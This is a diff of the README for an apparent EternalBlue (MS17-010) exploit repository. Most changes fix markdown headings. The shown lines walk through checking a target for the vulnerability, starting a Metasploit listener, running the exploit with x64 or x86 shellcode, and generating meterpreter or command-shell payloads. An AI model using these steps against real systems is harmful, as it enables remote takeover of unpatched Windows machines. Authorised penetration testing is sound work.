@@ -24,7 +24,7 @@ You must own the target system or have explicit permission to test it. Misuse ma
 ##  Setup & Usage
 
 ### 1. Clone the repository
-```bash
+
 git clone https://github.com/YOUR_USERNAME/AutoBlue-MS17-010.git
 cd AutoBlue-MS17-010
 
@@ -36,25 +36,25 @@ pip install -r requirements.txt
 ### 3. Verify the target is vulnerable
 python eternal_checker.py <TARGET_IP>
 
-4. Start a Metasploit listener (optional)
+### 4. Start a Metasploit listener (optional)
 ./listener_prep.sh
 Follow the prompts (use the same LHOST/LPORT as when generating payloads).
 
-5. Run the exploit
+### 5. Run the exploit
 For a 64‑bit target:
 python eternalblue_exploit.py <TARGET_IP> shellcode/sc_x64_msf.bin
 
 For a 32‑bit target:
 python eternalblue_exploit.py <TARGET_IP> shellcode/sc_x86_msf.bin
 
-Customisation
+### Customisation
 Generate your own shellcode (if needed)
 cd shellcode
 ./shell_prep.sh
 Enter your LHOST, desired ports, and payload type (staged/stageless, cmd/meterpreter).
 New .bin files will be created.
 
-Dependencies
+### Dependencies
 Python 3.12+
 
 nasm (for compiling kernel shellcode)
